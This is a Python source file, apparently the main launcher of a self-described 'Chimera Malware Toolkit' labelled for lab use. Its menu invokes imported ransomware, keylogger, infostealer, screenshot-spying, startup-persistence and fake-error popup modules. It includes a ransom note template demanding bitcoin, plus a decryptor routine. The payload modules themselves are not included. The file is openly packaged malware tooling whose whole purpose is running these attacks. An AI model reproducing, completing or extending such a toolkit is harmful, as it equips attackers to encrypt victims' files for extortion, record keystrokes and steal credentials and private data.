
from colorama import Fore, Style, init
init(autoreset=True)

import os
import decryptor
import ransomware
import keylogger
import infostealer
import screenspy
import persistenc
import popup_spam

def display_banner():
    """
    Displays an ASCII art banner for Chimera.
    """
    banner = f"""{Fore.RED}
                                                                                        
		           ,--,                  ____                                       
	  ,----..        ,--.'|   ,---,        ,'  , `.    ,---,.,-.----.      ,---,        
	 /   /   \    ,--,  | :,`--.' |     ,-+-,.' _ |  ,'  .' |\    /  \    '  .' \       
	|   :     :,---.'|  : '|   :  :  ,-+-. ;   , ||,---.'   |;   :    \  /  ;    '.     
	.   |  ;. /|   | : _' |:   |  ' ,--.'|'   |  ;||   |   .'|   | .\ : :  :       \    
	.   ; /--` :   : |.'  ||   :  ||   |  ,', |  '::   :  |-,.   : |: | :  |   /\   \   
	;   | ;    |   ' '  ; :'   '  ;|   | /  | |  ||:   |  ;/||   |  \ : |  :  ' ;.   :  
	|   : |    '   |  .'. ||   |  |'   | :  | :  |,|   :   .'|   : .  / |  |  ;/  \   \ 
	.   | '___ |   | :  | ''   :  ;;   . |  ; |--' |   |  |-,;   | |  \ '  :  | \  \ ,' 
	'   ; : .'|'   : |  : ;|   |  '|   : |  | ,    '   :  ;/||   | ;\  \|  |  '  '--'   
	'   | '/  :|   | '  ,/ '   :  ||   : '  |/     |   |    \:   ' | \.'|  :  :         
	|   :    / ;   : ;--'  ;   |.' ;   | |`-'      |   :   .':   : :-'  |  | ,'         
	 \   \ .'  |   ,/      '---'   |   ;/          |   | ,'  |   |.'    `--''           
	  `---`    '---'               '---'           `----'    `---'                      
                                                                                    
                               CHIMERA MALWARE TOOLKIT                          
    """
    print(banner)


def display_menu():
    """Prints the main menu to the screen."""
    print("\n" + "="*50)
    print("      CHIMERA MALWARE ARSENAL (For Lab Use Only)")
    print("="*50)
    print( f"{Fore.RED}[1] Run Ransomware Payload(chose option '7' to decrypt)")
    print(f"{Fore.RED}[2] Run Keylogger Payload")
    print(f"{Fore.RED}[3] Run Infostealer Payload")
    print(f"{Fore.RED}[4] Run ScreenSpy (Screenshot Taker)")
    print(f"{Fore.RED}[5] Add Chimera to Startup (Persistence)")
    print(f"{Fore.RED}[6] Spam Popups (Fake Errors)")
    print(f"{Fore.BLUE}[7] Decrypt Files (Decryptor Tool)")
    print( f"{Fore.RED}[99] Exit")
    print("="*50)

def payload_ransomware():
    print("Before testing the ransomware please create dummy files in a directory to target")
    directory = input("Enter the directory to attack (default: current folder): ") or "."
    note_content = {
        "filename": "RANSOM_NOTE",
        "content": """
          ALL YOUR FILES HAVE BEEN ENCRYPTED.
          =============================
          To recover them:
          1. Pay 0.05 BTC to wallet: bc1qyourwalletaddressxxxxxxxxxx
          2. Email your payment proof to: hacker@protonmail.com
          =============================
          Failure to pay within 72 hours will result in permanent deletion.
        """
    }
    ransomware.ransomware_attack(directory, note_content)

def payload_decryptor():
    """
    Executes the decryptor tool within Chimera.
    """
    # Directory where files are encrypted
    target_directory = input("Enter the directory to search for encrypted files (default: home directory): ") or os.path.expanduser("~")

    # Key file
    key_file = "KEY.txt"
    encrypted_extension = ".darksaiyan"
    ransom_note_name = "HOW_TO_RECOVER"

    # Step 1: Load the decryption key
    key = decryptor.load_key(os.path.join(target_directory, key_file))

    # Step 2: Search for ransom notes and delete them
    decryptor.delete_ransom_notes(target_directory, ransom_note_name)

    # Step 3: Search for encrypted files
    encrypted_files = decryptor.find_files(target_directory, encrypted_extension)

    if not encrypted_files:
        print("[!] No encrypted files found. Exiting.")
        return

    # Step 4: Decrypt files
    decryptor.decrypt_files(encrypted_files, key, encrypted_extension)
    

def payload_keylogger():
    """this function will cal our log function"""
    keylogger.start_logging()
    
def payload_infostealer():
    infostealer.start_stealing()

def payload_screenspy():
    """This function calls the screenspy module."""
    screenspy.capture_screen()

def main():
    """The main loop and logic for the toolkit."""
    while True:
        # -----------------------------------------------------------------
        ### Display the menu.
        display_banner()
        display_menu()
        
        
        # -----------------------------------------------------------------
        ### Get the user's choice.
        
        choice = input("Enter your choise: ") 
        
        # -----------------------------------------------------------------
        ### Check the user's choice and take action.

        if choice == '1' :
        	payload_ransomware()
        elif choice == '2' :
        	payload_keylogger()
        elif choice == '3' :
        	payload_infostealer()
        elif choice == '4' :
        	payload_screenspy()
        elif choice == '5':
        	persistenc.add_to_startup()
        elif choice == '6':
                popup_spam.spam_popups()
        elif choice == '7':
                payload_decryptor()
        elif choice == '99' :
        	break
        else :
        	print("Invalid input!")
  
        # -----------------------------------------------------------------
        
        # Add a small delay for readability before the loop repeats
        input("\n--- Press Enter to continue ---")


if __name__ == "__main__":
    main()
    
